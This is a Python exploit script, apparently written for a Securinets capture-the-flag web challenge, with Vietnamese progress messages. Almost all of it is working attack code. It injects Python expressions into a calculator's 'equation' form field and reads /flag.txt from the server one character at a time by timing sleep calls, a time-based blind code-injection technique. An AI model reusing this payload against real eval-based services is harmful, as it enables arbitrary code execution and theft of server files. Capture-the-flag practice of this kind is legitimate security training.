import requests, string, time

url = "http://web.ctf-friendly.securinets.tn:1001/calculate"
field = "equation"
sleep_time = 2.0
max_flag_len = 80
def baseline_latency(n=5):
    t = []
    for _ in range(n):
        s = time.time()
        requests.post(url, data={field: "0"})
        t.append(time.time()-s)
    return sum(t)/len(t)

base = baseline_latency()
threshold = base + sleep_time*0.6 
import string as _s
charset = ''.join(ch for ch in _s.printable if ch not in {'\r','\n','\t','\x0b','\x0c'})

flag = ""
print("[*] Bắt đầu trích xuất flag... (baseline=%.3fs, threshold=%.3fs)" % (base, threshold))

for _ in range(max_flag_len):
    found = False
    for c in charset:
        prefix_bytes = repr((flag + c).encode())
        n = len(flag) + 1
        payload = (
            f"(__import__('builtins').open('/flag.txt','rb').read({n})=={prefix_bytes})"
            f" and __import__('time').sleep({sleep_time}) or 0"
        )

        start = time.time()
        requests.post(url, data={field: payload})
        dt = time.time() - start

        if dt >= threshold:
            flag += c
            print(f"[+] Found char → {flag}")
            found = True
            if c == "}":
                print(f"[✓] Flag: {flag}")
                raise SystemExit
            break

    if not found:
        print("[!] Không tìm thấy ký tự tiếp theo – thử các mẹo dưới đây rồi chạy lại.")
        break
